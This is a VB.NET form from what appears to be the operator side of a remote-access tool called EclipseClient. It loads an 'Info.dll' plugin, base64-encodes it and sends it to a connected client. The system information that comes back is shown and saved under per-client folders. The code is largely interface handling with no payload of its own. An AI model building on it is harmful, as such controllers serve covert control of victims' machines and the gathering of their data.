Imports System.IO

Public Class INFO
    Public C As Client
    Public CID As String
    Private Sub INFO_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ref()
    End Sub
    Public Sub ref()
        Dim B As Byte()
        Try
            TextBox1.Clear()
            ToolStripStatusLabel1.ForeColor = Color.White
            ToolStripStatusLabel1.Text = "Information..."
            B = SB("Xinfo" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("EclipseClient\Plugins\Info.dll")))

        Catch ex As Exception
            ToolStripStatusLabel1.ForeColor = Color.Red
            ToolStripStatusLabel1.Text = "Error!"
            MessageBox.Show(ex.Message)
            Return
        End Try


        Dim ClientReq As New Outcoming_Requests(C, B)
        Pending.Req_Out.Add(ClientReq)
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub


    Private Sub RefrechToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefrechToolStripMenuItem.Click
        ref()
    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        Try
            Clipboard.SetText(TextBox1.SelectedText)
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub SaveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveToolStripMenuItem.Click
        Try
            If TextBox1.Text = Nothing Then
            Else
                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads") Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads")
                End If

                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & CID) Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & CID)
                End If

                If Not IO.Directory.Exists(Application.StartupPath & "\Downloads" & "\" & CID & "\Information") Then
                    IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads" & "\" & CID & "\Information")
                End If

                Dim objWriter As New System.IO.StreamWriter(Application.StartupPath & "\Downloads" & "\" & CID & "\Information" & "\" & DateAndTime.Now.ToString("yyMMddhhmmssfff") & ".txt", False)
                objWriter.WriteLine(TextBox1.Text)
                objWriter.Close()
            End If
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    Private Sub Guna2CircleButton1_Click(sender As Object, e As EventArgs)
        Me.Close()
    End Sub

    Private Sub Guna2CircleButton2_Click(sender As Object, e As EventArgs)
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub Guna2ControlBox1_Click(sender As Object, e As EventArgs) 
        Me.Close()
    End Sub

    Private Sub Guna2ControlBox2_Click(sender As Object, e As EventArgs) 
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged

    End Sub

    Private Sub Guna2ControlBox1_Click_1(sender As Object, e As EventArgs) Handles Guna2ControlBox1.Click
        Me.Close()
    End Sub

    Private Sub Guna2ControlBox2_Click_1(sender As Object, e As EventArgs) Handles Guna2ControlBox2.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub guna2Panel1_Paint(sender As Object, e As PaintEventArgs) Handles guna2Panel1.Paint

    End Sub
End Class